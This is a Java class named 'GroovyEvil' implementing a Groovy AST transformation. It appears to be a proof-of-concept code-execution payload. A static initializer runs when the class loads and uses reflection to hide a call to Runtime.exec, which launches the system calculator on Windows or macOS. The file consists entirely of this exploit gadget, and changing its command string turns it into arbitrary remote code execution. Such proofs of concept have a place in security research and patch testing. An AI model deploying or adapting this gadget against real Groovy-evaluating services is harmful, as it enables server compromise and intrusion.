import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

@GroovyASTTransformation
public class GroovyEvil implements ASTTransformation{

    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {
    }
    static{
        String winCalc = "calc.exe";
        String MacCalc = "open /System/Applications/Calculator.app";
        try{
            Class os = Class.forName("java.lang.System");
            Constructor m = os.getDeclaredConstructor();
            m.setAccessible(true);
            Object sys = os.getMethod("getProperty",String.class).invoke(m.newInstance(),"os.name");

            Class clazz = Class.forName("java.lang.Runtime");
            clazz.getMethod("exec",String.class)
                    .invoke(clazz.getMethod("getRuntime")
                            .invoke(clazz),sys.toString().startsWith("Win") ? winCalc : MacCalc);
        } catch (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException | InstantiationException e) {
            e.printStackTrace();
        }
    }

}
